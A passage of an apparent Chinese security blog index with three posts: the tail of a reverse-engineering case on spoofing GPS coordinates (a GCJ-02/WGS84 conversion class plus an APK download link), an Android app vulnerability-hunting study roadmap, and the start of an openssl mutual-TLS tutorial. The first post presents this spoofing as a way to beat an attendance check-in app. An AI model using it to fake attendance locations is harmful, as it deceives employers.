href=\"https://lbs.amap.com/tools/picker%E5%8F%96%E5%9D%90%E6%A0%87%E3%80%82\">https://lbs.amap.com/tools/picker取坐标。</a></p>\n<p>当我从这个网站取回来坐标后，并没有效果，显示的位置是目标坐标的4点钟方向再过一段距离。</p>\n<p>后来问了其他有坐标处理经验的朋友阿肥，他告诉我地图坐标可能需要做标准换算。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">JXMapUtil</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">PN_GAODE_MAP</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;com.autonavi.minimap&quot;</span>;   <span class=\"comment\">// 高德地图包名</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">PN_BAIDU_MAP</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;com.baidu.BaiduMap&quot;</span>;     <span class=\"comment\">// 百度地图包名</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">PN_TENCENT_MAP</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;com.tencent.map&quot;</span>;      <span class=\"comment\">// 腾讯地图包名</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">double</span> <span class=\"variable\">a</span> <span class=\"operator\">=</span> <span class=\"number\">6378245.0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">double</span> <span class=\"variable\">pi</span> <span class=\"operator\">=</span> <span class=\"number\">3.1415926535897932384626</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">double</span> <span class=\"variable\">ee</span> <span class=\"operator\">=</span> <span class=\"number\">0.00669342162296594323</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//____________________________坐标转化_____________________________________________________</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 转化为火星坐标系</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> latitude</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> longitude</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">double</span>[] toGCJ02Point(<span class=\"type\">double</span> latitude, <span class=\"type\">double</span> longitude) &#123;</span><br><span class=\"line\">        <span class=\"type\">double</span>[] dev = calDev(latitude, longitude);</span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">retLat</span> <span class=\"operator\">=</span> latitude + dev[<span class=\"number\">0</span>];</span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">retLon</span> <span class=\"operator\">=</span> longitude + dev[<span class=\"number\">1</span>];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">double</span>[] &#123; retLat, retLon &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 火星坐标系 转化为 WGS84(国际坐标系</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> latitude</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> longitude</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">double</span>[] toWGS84Point(<span class=\"type\">double</span> latitude, <span class=\"type\">double</span> longitude) &#123;</span><br><span class=\"line\">        <span class=\"type\">double</span>[] dev = calDev(latitude, longitude);</span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">retLat</span> <span class=\"operator\">=</span> latitude - dev[<span class=\"number\">0</span>];</span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">retLon</span> <span class=\"operator\">=</span> longitude - dev[<span class=\"number\">1</span>];</span><br><span class=\"line\">        dev = calDev(retLat, retLon);</span><br><span class=\"line\">        retLat = latitude - dev[<span class=\"number\">0</span>];</span><br><span class=\"line\">        retLon = longitude - dev[<span class=\"number\">1</span>];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">double</span>[] &#123; retLat, retLon &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">double</span>[] calDev(<span class=\"type\">double</span> wgLat, <span class=\"type\">double</span> wgLon) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isOutOfChina(wgLat, wgLon)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">double</span>[] &#123; <span class=\"number\">0</span>, <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">dLat</span> <span class=\"operator\">=</span> calLat(wgLon - <span class=\"number\">105.0</span>, wgLat - <span class=\"number\">35.0</span>);</span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">dLon</span> <span class=\"operator\">=</span> calLon(wgLon - <span class=\"number\">105.0</span>, wgLat - <span class=\"number\">35.0</span>);</span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">radLat</span> <span class=\"operator\">=</span> wgLat / <span class=\"number\">180.0</span> * pi;</span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">magic</span> <span class=\"operator\">=</span> Math.sin(radLat);</span><br><span class=\"line\">        magic = <span class=\"number\">1</span> - ee * magic * magic;</span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">sqrtMagic</span> <span class=\"operator\">=</span> Math.sqrt(magic);</span><br><span class=\"line\">        dLat = (dLat * <span class=\"number\">180.0</span>) / ((a * (<span class=\"number\">1</span> - ee)) / (magic * sqrtMagic) * pi);</span><br><span class=\"line\">        dLon = (dLon * <span class=\"number\">180.0</span>) / (a / sqrtMagic * Math.cos(radLat) * pi);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">double</span>[] &#123; dLat, dLon &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"title function_\">isOutOfChina</span><span class=\"params\">(<span class=\"type\">double</span> lat, <span class=\"type\">double</span> lon)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (lon &lt; <span class=\"number\">72.004</span> || lon &gt; <span class=\"number\">137.8347</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (lat &lt; <span class=\"number\">0.8293</span> || lat &gt; <span class=\"number\">55.8271</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">double</span> <span class=\"title function_\">calLat</span><span class=\"params\">(<span class=\"type\">double</span> x, <span class=\"type\">double</span> y)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">ret</span> <span class=\"operator\">=</span> -<span class=\"number\">100.0</span> + <span class=\"number\">2.0</span> * x + <span class=\"number\">3.0</span> * y + <span class=\"number\">0.2</span> * y * y + <span class=\"number\">0.1</span> * x * y + <span class=\"number\">0.2</span> * Math.sqrt(Math.abs(x));</span><br><span class=\"line\">        ret += (<span class=\"number\">20.0</span> * Math.sin(<span class=\"number\">6.0</span> * x * pi) + <span class=\"number\">20.0</span> * Math.sin(<span class=\"number\">2.0</span> * x * pi)) * <span class=\"number\">2.0</span> / <span class=\"number\">3.0</span>;</span><br><span class=\"line\">        ret += (<span class=\"number\">20.0</span> * Math.sin(y * pi) + <span class=\"number\">40.0</span> * Math.sin(y / <span class=\"number\">3.0</span> * pi)) * <span class=\"number\">2.0</span> / <span class=\"number\">3.0</span>;</span><br><span class=\"line\">        ret += (<span class=\"number\">160.0</span> * Math.sin(y / <span class=\"number\">12.0</span> * pi) + <span class=\"number\">320</span> * Math.sin(y * pi / <span class=\"number\">30.0</span>)) * <span class=\"number\">2.0</span> / <span class=\"number\">3.0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">double</span> <span class=\"title function_\">calLon</span><span class=\"params\">(<span class=\"type\">double</span> x, <span class=\"type\">double</span> y)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">ret</span> <span class=\"operator\">=</span> <span class=\"number\">300.0</span> + x + <span class=\"number\">2.0</span> * y + <span class=\"number\">0.1</span> * x * x + <span class=\"number\">0.1</span> * x * y + <span class=\"number\">0.1</span> * Math.sqrt(Math.abs(x));</span><br><span class=\"line\">        ret += (<span class=\"number\">20.0</span> * Math.sin(<span class=\"number\">6.0</span> * x * pi) + <span class=\"number\">20.0</span> * Math.sin(<span class=\"number\">2.0</span> * x * pi)) * <span class=\"number\">2.0</span> / <span class=\"number\">3.0</span>;</span><br><span class=\"line\">        ret += (<span class=\"number\">20.0</span> * Math.sin(x * pi) + <span class=\"number\">40.0</span> * Math.sin(x / <span class=\"number\">3.0</span> * pi)) * <span class=\"number\">2.0</span> / <span class=\"number\">3.0</span>;</span><br><span class=\"line\">        ret += (<span class=\"number\">150.0</span> * Math.sin(x / <span class=\"number\">12.0</span> * pi) + <span class=\"number\">300.0</span> * Math.sin(x / <span class=\"number\">30.0</span> * pi)) * <span class=\"number\">2.0</span> / <span class=\"number\">3.0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>也就是你从网站拾取的坐标需要转wgs84坐标</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">double</span>[] wgs84Point = JXMapUtil.toWGS84Point(latitude, longitude);</span><br></pre></td></tr></table></figure>\n\n<p>这样的坐标喂给高德腾讯百度相关定位就OK了。</p>\n<p>我这里提供一个apk方便坐标拾取。</p>\n<p>如果使用，打卡拾取，点击你需要的位置，然后右下角点击√，返回的坐标就是wgs84标准的坐标了。</p>\n<p>工具下载地址：</p>\n<p><a href=\"https://wwsk.lanzouy.com/iAFqH0jut6yj\">https://wwsk.lanzouy.com/iAFqH0jut6yj</a></p>\n<p>MD5：d3c87fdd3d1982d29d485dc7baaab176</p>\n<p><img src=\"https://reverse-1307040378.cos.ap-chengdu.myqcloud.com/reverse2022020801/1675822080_4.gif\"></p>\n<p>这样的坐标就是冇问题的啦！</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>这个案例允许动态调试，没有root检查等等阻拦，是一个很好的实战例子。</p>\n<p>在做这个逆向的事情的前提，我个人认为，你应该具备以下知识。</p>\n<p>0：先学会开发！达到入门就OK。</p>\n<p>1：Java基础扎实，有Android应用层开发的经验，能看懂SDK代码。</p>\n<p>2：熟悉开发中使用到的第三方库，比如这里用到的gson，rxJava，高德定位SDK。</p>\n<p>3：熟练使用jadx，apktool，AndroidKiller，Frida，Xposed等工具。</p>\n<p>题外话，准备好AOSP系统代码，能修改系统且刷入手机，方便定位某些系统api，甚至定制接口。</p>\n<p>夸张一点说十行代码搞定某定打卡（已实现了）（这只是其中一个案例）</p>\n<p>我现在工作是搞Android TV launcher开发的，偶尔也会做点盒子，手机的业务，算是有一点点开发经验。</p>\n<p>在熟悉开发的前提下，去逆向会顺利很多 。</p>\n<p>–来自业余逆向菜鸡的总结。</p>\n<p>我们在星球安全后厨等你~</p>\n","categories":["协议分析"],"tags":["逆向技术","协议分析"]},{"title":"Android漏洞之战目录篇","url":"/2022/12/02/%E4%B8%BB%E9%A1%B5/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>学习了这么久的Android APP漏洞挖掘，很多朋友私聊我如果系统的学习 Android APP漏洞挖掘，说实话作为一名刚入门的新手小白，实在不敢说如何学习才能算一个比较正确的学习路线，这里只是简单分享一下自己认为的学习路线和心得体会，如果有什么不足的就请相关大佬进行补充吧。</p>\n<span id=\"more\"></span>\n<h2 id=\"二、学习路线\"><a href=\"#二、学习路线\" class=\"headerlink\" title=\"二、学习路线\"></a>二、学习路线</h2><p>Android 漏洞挖掘我认为主要是分为Android 系统层面的漏洞挖掘和APP端的系统层面，这里我们主要介绍APP端的系统挖掘，有朋友问我，学习App漏洞挖掘，是不是简单的原理了解，复现一些案例就可以了，我觉得这样可能远远不够吧，漏洞挖掘与逆向技术总是分不开的，试想如果你拿到一个app，你都不会脱壳，也不会抓取https报文，不会协议分析，不会hook，其实想挖到比较有价值的漏洞，其实很难，所以一个漏洞人员应该至少了解Android app开发、常见漏洞原理、Android APP逆向技术。三者合一可能才算的一名好的漏洞人员，当然我只认为自己也还是一名新手，学习之路任重而道远了。下面将逐步介绍，有一些也可能在后续再慢慢补全。</p>\n<p><strong>Android APP漏洞挖掘学习路线：</strong></p>\n<h3 id=\"1-初阶\"><a href=\"#1-初阶\" class=\"headerlink\" title=\"1.初阶\"></a>1.初阶</h3><p><strong>工具篇：</strong></p>\n<h4 id=\"（1）工具基本使用\"><a href=\"#（1）工具基本使用\" class=\"headerlink\" title=\"（1）工具基本使用\"></a>（1）工具基本使用</h4><p>如果你想学习一个领域的东西，我认为其实你可以先尝试去使用它的工具，这样相比一上来学习理论知识，可能更加有趣一点，而且在后面学习过程中，掌握一些基本的工具，也是开始学习的基础。那么Android APP漏洞挖掘你可能需要掌握的工具：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">基本的逆向工具：AndroidKiller、Android Studio、JEB、jadx-gui、010Editor、GDA、IDA、GDB等</span><br><span class=\"line\">漏洞测试工具：drozer、Mobsf</span><br></pre></td></tr></table></figure>\n\n<p>基本的逆向工具很多可以在看雪论坛和吾爱破解上找到，所以基本资源还是很容易找的</p>\n<p>漏洞测试工具：<a href=\"https://bbs.pediy.com/thread-269196.htm\">Android漏洞挖掘三板斧——drozer+Inspeckage(Xposed)+MobSF</a></p>\n<p><strong>能力篇：</strong></p>\n<h4 id=\"（2）掌握Android-APP动静态调试技巧：\"><a href=\"#（2）掌握Android-APP动静态调试技巧：\" class=\"headerlink\" title=\"（2）掌握Android APP动静态调试技巧：\"></a>（2）掌握Android APP动静态调试技巧：</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">静态分析：</span><br><span class=\"line\">Smail源码分析：Android Killer</span><br><span class=\"line\">java层：Jadx-gui+GDA</span><br><span class=\"line\">so层：IDA</span><br><span class=\"line\">动态分析：</span><br><span class=\"line\">java层：Android Studio + JEB 动态调试</span><br><span class=\"line\">so层：GDB+IDA 动态调试</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）掌握Hook-动态注入技术：\"><a href=\"#（3）掌握Hook-动态注入技术：\" class=\"headerlink\" title=\"（3）掌握Hook 动态注入技术：\"></a>（3）掌握Hook 动态注入技术：</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">熟练使用Hook框架：</span><br><span class=\"line\">Xposed和frida的基本使用</span><br></pre></td></tr></table></figure>\n\n<p>Xposed学习：参考<a href=\"https://bbs.pediy.com/thread-269616.htm\">源码编译（2）——Xopsed源码编译详解 </a>和开发过程中使用Xposed官方文档即可</p>\n<p>frida学习：参考肉丝大佬<a href=\"https://github.com/r0ysue/AndroidSecurityStudy\">GitHub - r0ysue&#x2F;AndroidSecurityStudy: 安卓应用安全学习</a></p>\n<h4 id=\"（4）掌握Android-APP加壳和脱壳技术：\"><a href=\"#（4）掌握Android-APP加壳和脱壳技术：\" class=\"headerlink\" title=\"（4）掌握Android APP加壳和脱壳技术：\"></a>（4）掌握Android APP加壳和脱壳技术：</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">掌握动态加载的基本原理</span><br><span class=\"line\">掌握dex整体加固、抽取壳、dex2c/VMP的基本原理</span><br><span class=\"line\">熟练使用fdex、frida_dump、fart、youpk等多种脱壳工具</span><br><span class=\"line\">掌握GDB动调脱取VMP的方法</span><br></pre></td></tr></table></figure>\n\n<p>脱壳技术学习推荐：看雪2w班课程和肉丝大佬的脱壳王课程，朋友给我说这两门课的质量很高</p>\n<h4 id=\"（5）掌握抓包和协议分析的技术：\"><a href=\"#（5）掌握抓包和协议分析的技术：\" class=\"headerlink\" title=\"（5）掌握抓包和协议分析的技术：\"></a>（5）掌握抓包和协议分析的技术：</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">掌握密码学理论初步：学习AES、DEA、Base64等常见的密码算法原理</span><br><span class=\"line\">掌握基本工具的使用：Fiddler+Charles+burpsuit</span><br><span class=\"line\">掌握如何抓取各个协议层的https报文</span><br><span class=\"line\">掌握协议分析的流程：如何将抓包和静态分析、动态分析、hook技术结合使用</span><br></pre></td></tr></table></figure>\n\n<p>工具书推荐：r0ysue Frida逆向与抓包实战 </p>\n<p>视频推荐：看雪2w班</p>\n<p><strong>理论篇：</strong></p>\n<h4 id=\"（6）掌握Android-App开发和APP漏洞的基本原理：\"><a href=\"#（6）掌握Android-App开发和APP漏洞的基本原理：\" class=\"headerlink\" title=\"（6）掌握Android App开发和APP漏洞的基本原理：\"></a>（6）掌握Android App开发和APP漏洞的基本原理：</h4><p>推荐参考Android APP漏洞之战系列文章：</p>\n<p>本系列主要分为Android 开发原理和漏洞原理两部分，推荐学习</p>\n<p>[<a href=\"https://bbs.pediy.com/thread-269211.htm\">原创]Android APP漏洞之战（1）——Activity漏洞挖掘详解-Android安全-看…</a></p>\n<p>[<a href=\"https://bbs.pediy.com/thread-269255.htm\">原创]Android APP漏洞之战（2）——Service漏洞挖掘详解-Android安全-看雪…</a></p>\n<p>[<a href=\"https://bbs.pediy.com/thread-269309.htm\">原创]Android APP漏洞之战（3）——Broadcast Recevier漏洞详解-And…</a></p>\n<p><a href=\"https://bbs.pediy.com/thread-269447.htm\">Android APP漏洞之战（4）——Content Provider漏洞详解</a> </p>\n<p><a href=\"https://bbs.pediy.com/thread-269988.htm\">原创]Android APP漏洞之战（5）——权限安全和安全配置漏洞详解</a> </p>\n<p>[<a href=\"https://bbs.pediy.com/thread-270634.htm\">原创]Android APP漏洞之战（6）——HTTP&#x2F;HTTPs通信漏洞详解</a> </p>\n<p>[<a href=\"https://bbs.pediy.com/thread-271122.htm\">原创]Android APP漏洞之战（7）——信息泄露漏洞详解</a></p>\n<p>后续还在继续更新，争取今年写完</p>\n<p>到这里为止，我觉得可以算的算一名初级的Android APP漏洞挖掘工程师了吧</p>\n<h3 id=\"2-中阶\"><a href=\"#2-中阶\" class=\"headerlink\" title=\"2.中阶\"></a>2.中阶</h3><h4 id=\"（7）学习掌握漏洞自动化工具开发\"><a href=\"#（7）学习掌握漏洞自动化工具开发\" class=\"headerlink\" title=\"（7）学习掌握漏洞自动化工具开发\"></a>（7）学习掌握漏洞自动化工具开发</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">利用一些开源框架，如AndroGuard、appt、jadx等工具，自己开发一些可以自动测试APP漏洞的安全工具，类似drozer、mobsf等</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（8）Fuzz技术的学习\"><a href=\"#（8）Fuzz技术的学习\" class=\"headerlink\" title=\"（8）Fuzz技术的学习\"></a>（8）Fuzz技术的学习</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">学习Fuzz技术在APP上的使用，现在Fuzz技术在漏洞挖掘方面的使用不断增加，学习Fuzz技术的原理</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-高阶\"><a href=\"#3-高阶\" class=\"headerlink\" title=\"3.高阶\"></a>3.高阶</h3><h4 id=\"（9）逆向技术的全面进阶\"><a href=\"#（9）逆向技术的全面进阶\" class=\"headerlink\" title=\"（9）逆向技术的全面进阶\"></a>（9）逆向技术的全面进阶</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">脱壳技术：</span><br><span class=\"line\">定制自动化脱壳机，解决抽取壳的问题，进一步学习VMP和ollvm</span><br><span class=\"line\">学习so层加壳的基本原理，掌握so层高级混淆ollvm，学习so层的脱壳方法</span><br><span class=\"line\">Hook技术：</span><br><span class=\"line\">熟练定制Xposed框架、解决frida的反调试问题，学习frida hook java层和so层</span><br><span class=\"line\">掌握一些开源的hook框架：inline Hook库等等</span><br><span class=\"line\">密码技术：</span><br><span class=\"line\">掌握破密算法的编写，学习如何编写破密算法</span><br><span class=\"line\">抓包技术：</span><br><span class=\"line\">使用开源框架JustMe、r0capter抓取https层面的报文</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（10）Fuzz技术进阶\"><a href=\"#（10）Fuzz技术进阶\" class=\"headerlink\" title=\"（10）Fuzz技术进阶\"></a>（10）Fuzz技术进阶</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">熟练掌握Fuzz在app上的漏洞挖掘技术</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、总结\"><a href=\"#三、总结\" class=\"headerlink\" title=\"三、总结\"></a>三、总结</h2><p>这里是考虑不少朋友私聊我Android APP漏洞如何挖掘学习，我本人也是入门菜鸟，所以肯定有很多不会地方，只是将自己的学习心得梳理了一下，有不足之处请论坛各位大佬就指正出来。</p>\n","categories":["Android漏洞之战"],"tags":["Android","漏洞"]},{"title":"Android自定义证书实现双向认证1（littleQ）","url":"/2023/12/24/littleQ/","content":"<h1 id=\"Android自定义证书实现双向认证（littleQ）\"><a href=\"#Android自定义证书实现双向认证（littleQ）\" class=\"headerlink\" title=\"Android自定义证书实现双向认证（littleQ）\"></a>Android自定义证书实现双向认证（littleQ）</h1><p>作者：littleQ</p>\n<p>相信各位读者至少应该是见过使用双向认证的Android程序了，那么如果作为开发者，我们如何来实现双向认证呢，本文来一起看一下如何利用自签名证书实现双向认证。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2><p>要实现双向认证，我们首先肯定是要生成证书了，这里工具我选择的是openssl，在mac&#x2F;ubuntu上这个命令是可以直接执行的，在win上，自行安装下吧，环境安装不在本文的讨论范围之内。</p>\n<h3 id=\"利用openssl生成CA证书\"><a href=\"#利用openssl生成CA证书\" class=\"headerlink\" title=\"利用openssl生成CA证书\"></a>利用openssl生成CA证书</h3><h4 id=\"生成CA根证书\"><a href=\"#生成CA根证书\" class=\"headerlink\" title=\"生成CA根证书\"></a>生成CA根证书</h4><ul>\n<li>生成密钥</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl genrsa -out rootCA.key 2048</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_uAz6w8n6Lh.png\"></p>\n<ul>\n<li>生成请求文件(csr)</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl req -new -key rootCA.key -out rootCA.csr -sha256</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_8na2w7mJ9L.png\"></p>\n<p>这里里面内容可以随便输，没什么影响。</p>\n<ul>\n<li>生成crt证书</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl x509 -req -<span class=\"keyword\">in</span> rootCA.csr -signkey rootCA.key -out rootCA.crt -sha256</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_wos7giaHeG.png\"></p>\n<h3 id=\"自签名证书生成（服务端）\"><a href=\"#自签名证书生成（服务端）\" class=\"headerlink\" title=\"自签名证书生成（服务端）\"></a>自签名证书生成（服务端）</h3><ul>\n<li>生成密钥</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl genrsa -out serverCA.key 2048</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_OxVFSZScZt.png\"></p>\n<ul>\n<li>生成请求文件(csr)</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl req -new  -key serverCA.key -out serverCA.csr -sha256</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_JD-nsnLSwA.png\"></p>\n<p>这里需要注意下，这里必须和访问的域名一致，这里我用的ip地址，所以这里填我的ip地址，这里读者要根据自己的情况来处理。</p>\n<ul>\n<li>生成crt证书</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl x509 -req -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -<span class=\"keyword\">in</span> serverCA.csr -out serverCA.crt -sha256</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_Ia9oFzkR5r.png\"></p>\n<p>这里一共可以生成7个文件，如果生成少了，大概率是前面做错了，需要重新做。</p>\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_nCeIYIWmZ7.png\"></p>\n<h2 id=\"后端搭建\"><a href=\"#后端搭建\" class=\"headerlink\" title=\"后端搭建\"></a>后端搭建</h2><p>因为这是双向认证，所以我们需要搭建一个后端，这里我们采用springboot来搭建后端。</p>\n<h3 id=\"将服务端密钥-key文件转换为-p12文件\"><a href=\"#将服务端密钥-key文件转换为-p12文件\" class=\"headerlink\" title=\"将服务端密钥.key文件转换为.p12文件\"></a>将服务端密钥.key文件转换为.p12文件</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl pkcs12 -<span class=\"built_in\">export</span> -clcerts -<span class=\"keyword\">in</span> serverCA.crt -inkey serverCA.key -out serverCA.p12</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_mJrnQk3XzS.png\"></p>\n<p>这里需要输入一个密码，需要记住，后面要用。</p>\n<p>来看下我们生成的证书。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">keytool -list -keystore serverCA.p12</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_rEKoZFVQ0J.png\"></p>\n<p>注意，有这个打印才能是成功的，要注意，这里的指纹是SHA-256的，如果是SHA1，请注意这个Android10不认，需要重新搞，这里需要输入刚才设置的密码，密码先别忘记，等会还要用。</p>\n<h3 id=\"新建一个springboot项目\"><a href=\"#新建一个springboot项目\" class=\"headerlink\" title=\"新建一个springboot项目\"></a>新建一个springboot项目</h3><p>这个就不展开讲了，直接新建即可，然后在<code>application.yml</code>里面配置如下</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">server:</span></span><br><span class=\"line\">  <span class=\"attr\">port:</span> <span class=\"number\">18443</span></span><br><span class=\"line\">  <span class=\"attr\">servlet:</span></span><br><span class=\"line\">    <span class=\"attr\">context-path:</span> <span class=\"string\">/api</span></span><br><span class=\"line\">  <span class=\"attr\">ssl:</span></span><br><span class=\"line\">    <span class=\"attr\">key-store:</span> <span class=\"string\">classpath:serverCA.p12</span></span><br><span class=\"line\">    <span class=\"attr\">key-store-password:</span> <span class=\"string\">这是刚才所输入的密码</span></span><br><span class=\"line\">    <span class=\"attr\">keyStoreType:</span> <span class=\"string\">PKCS12</span></span><br><span class=\"line\">    <span class=\"attr\">keyAlias:</span> <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>然后写个helloword运行一下，我们直接来访问下。</p>\n<p><img 